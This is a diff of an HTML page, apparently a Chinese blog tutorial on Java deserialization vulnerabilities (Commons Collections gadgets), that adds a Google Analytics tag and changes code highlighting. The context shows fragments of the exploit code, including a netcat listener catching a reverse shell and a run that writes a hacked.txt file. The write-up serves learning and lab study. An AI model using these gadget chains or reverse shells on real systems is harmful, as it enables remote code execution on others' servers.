@@ -2,7 +2,16 @@
 <html lang="en">
 
 <head>
-  <meta charset="utf-8">
+  <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-0TWXQMVP52"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-0TWXQMVP52');
+</script>
+<meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <!-- iOS Safari -->
 <meta name="apple-mobile-web-app-capable" content="yes">
@@ -24,6 +33,7 @@
     font-size: 15px;
   }
 </style>
+
   <title>Java反序列化漏洞学习&nbsp;|&nbsp;Roadmap of Learning</title>
   <meta property="og:type" content="blog">
   <meta property="og:title" content="Java反序列化漏洞学习">
@@ -59,6 +69,8 @@
     
   
     
+  
+    
       <span class="Navbar__Delim">&centerdot;</span>
       <a href="project.html">
         <div class="Navbar__Btn">
@@ -80,6 +92,10 @@
           <span>About</span>
         </div>
       </a>
+    
+  
+    
+  
     
   
     
@@ -171,7 +187,7 @@ public class Main {
         Book d2=(Book)ois.readObject();
         ois.close();
     }
-}</span></span></span></code></pre><div id="https://www.notion.so/c995faea2f10486e9d0df3b85ca8a67a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">在本地监听1234端口，运行上述代码，即可实现反弹shell。</span></span></p></div><pre id="https://www.notion.so/11db51f8150d4284bfff8385a1e6832c" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>$ <span class="token function">nc</span> -lvn <span class="token number">1234</span>
+}</span></span></span></code></pre><div id="https://www.notion.so/c995faea2f10486e9d0df3b85ca8a67a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">在本地监听1234端口，运行上述代码，即可实现反弹shell。</span></span></p></div><pre id="https://www.notion.so/11db51f8150d4284bfff8385a1e6832c" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>$ <span class="token function">nc</span> <span class="token parameter variable">-lvn</span> <span class="token number">1234</span>
 Listening on <span class="token punctuation">[</span><span class="token number">0.0</span>.0.0<span class="token punctuation">]</span> <span class="token punctuation">(</span>family <span class="token number">2</span>, port <span class="token number">1234</span><span class="token punctuation">)</span>
 Connection from <span class="token number">127.0</span>.0.1 <span class="token number">41608</span> received<span class="token operator">!</span>
 <span class="token function">id</span>
@@ -263,7 +279,7 @@ public class Main {
         trsMap.put(&quot;1&quot;, &quot;helloworld&quot;);
         System.out.println(trsMap);
     }
-}</span></span></span></code></pre><div id="https://www.notion.so/fe0621ec438e4c959b49dadf1012e61f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">运行上面的代码，可以看到下面的结果。所有的key value都加了前缀。</span></span></p></div><pre id="https://www.notion.so/428b582369234e198e61f9103dd6a07d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>$ java -jar target/cc-1.jar
+}</span></span></span></code></pre><div id="https://www.notion.so/fe0621ec438e4c959b49dadf1012e61f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">运行上面的代码，可以看到下面的结果。所有的key value都加了前缀。</span></span></p></div><pre id="https://www.notion.so/428b582369234e198e61f9103dd6a07d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>$ <span class="token function">java</span> <span class="token parameter variable">-jar</span> target/cc-1.jar
 <span class="token punctuation">{</span>key_1<span class="token operator">=</span>value_helloworld<span class="token punctuation">}</span></span></span></span></code></pre><div id="https://www.notion.so/02a71cc395664f2b9cf2e53fa83757ba" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">在上面的代码中我们使用了自定义的Transformer进行操作。实际上这个库里还有很多已经集成好的Treansformer，其中，有几个关键的类，可以帮助我们构造任意执行的代码。</span></span></p></div><h2 id="https://www.notion.so/3a9bf5f2a71d44e7af2e926b75c04393" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/3a9bf5f2a71d44e7af2e926b75c04393"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">几个危险的Transformer</span></span></h2><ol class="NumberedListWrapper"><li id="https://www.notion.so/46437d48ad624ed6a6a7148e755bab72" class="NumberedList" value="1"><span class="SemanticStringArray"><span class="SemanticString">InvokerTransformer</span></span><div id="https://www.notion.so/ebfc0f6f5fa442f0a26c39f4908a13e0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">从名字可以看出，该类可以实现方法调用的功能</span></span></p></div><div id="https://www.notion.so/c6c56e8e03ff457db69affbad74d3bd0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">举例</span></span></p></div><pre id="https://www.notion.so/2c0c34e5b9bf49d8bc0841b1d6de79b8" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>public class Main {
     public static void main(String[] args) throws Exception {
         HashMap&lt;String, Class&gt; innerMap = new HashMap&lt;String, Class&gt;();
@@ -332,11 +348,11 @@ public class Main {
         ois.close();
         System.out.println(d.getClass());
     }
-}</span></span></span></code></pre><div id="https://www.notion.so/62c6f373d1d8484bb9bf2789f8754e18" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">运行程序，即可在当前目录下创建hack.txt文件</span></span></p></div><pre id="https://www.notion.so/c5d2e9f4c5af49ae88d3bc863e066b79" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>$ java -cp target/cc-1.jar com.Exp.Main
-$ java -cp target/cc-1.jar com.Exp.Exp
+}</span></span></span></code></pre><div id="https://www.notion.so/62c6f373d1d8484bb9bf2789f8754e18" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">运行程序，即可在当前目录下创建hack.txt文件</span></span></p></div><pre id="https://www.notion.so/c5d2e9f4c5af49ae88d3bc863e066b79" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>$ <span class="token function">java</span> <span class="token parameter variable">-cp</span> target/cc-1.jar com.Exp.Main
+$ <span class="token function">java</span> <span class="token parameter variable">-cp</span> target/cc-1.jar com.Exp.Exp
 class sun.reflect.annotation.AnnotationInvocationHandler
 $ <span class="token function">ls</span>
-dependency-reduced-pom.xml  exp.bin  hacked.txt  pom.xml  src  target</span></span></span></code></pre><h3 id="https://www.notion.so/3dfd47e2be064e38a09db97dc3fb1c7c" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/3dfd47e2be064e38a09db97dc3fb1c7c"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">复现中遇到的问题</span></span></h3><div id="https://www.notion.so/17d858c07a6e4243836241e4645dd710" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">没有执行利用代码？</span></span></p></div><div id="https://www.notion.so/d033fd458f304428bb62266a2e35aa21" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">这里使用的jdk版本为jdk1.7.0_80。在1.8以后，AnnotationInvocationHandler类进行了修复，因此不能再用上述的方法构造，运行时可能会报错</span></span></p></div><pre id="https://www.notion.so/9609258f77dd447bb63970df5fccfda3" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>$ java -jar target/cc-1.jar 
+dependency-reduced-pom.xml  exp.bin  hacked.txt  pom.xml  src  target</span></span></span></code></pre><h3 id="https://www.notion.so/3dfd47e2be064e38a09db97dc3fb1c7c" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/3dfd47e2be064e38a09db97dc3fb1c7c"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">复现中遇到的问题</span></span></h3><div id="https://www.notion.so/17d858c07a6e4243836241e4645dd710" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">没有执行利用代码？</span></span></p></div><div id="https://www.notion.so/d033fd458f304428bb62266a2e35aa21" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">这里使用的jdk版本为jdk1.7.0_80。在1.8以后，AnnotationInvocationHandler类进行了修复，因此不能再用上述的方法构造，运行时可能会报错</span></span></p></div><pre id="https://www.notion.so/9609258f77dd447bb63970df5fccfda3" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>$ <span class="token function">java</span> <span class="token parameter variable">-jar</span> target/cc-1.jar 
 javaException <span class="token keyword">in</span> thread <span class="token string">"main"</span> java.lang.reflect.InaccessibleObjectException: Unable to <span class="token function">make</span> sun.reflect.annotation.AnnotationInvocationHandler<span class="token punctuation">(</span>java.lang.Class,java.util.Map<span class="token punctuation">)</span> accessible: module java.base does not <span class="token string">"opens sun.reflect.annotation"</span> to unnamed module @486bb9ce
         at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible<span class="token punctuation">(</span>AccessibleObject.java:354<span class="token punctuation">)</span>
         at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible<span class="token punctuation">(</span>AccessibleObject.java:297<span class="token punctuation">)</span>
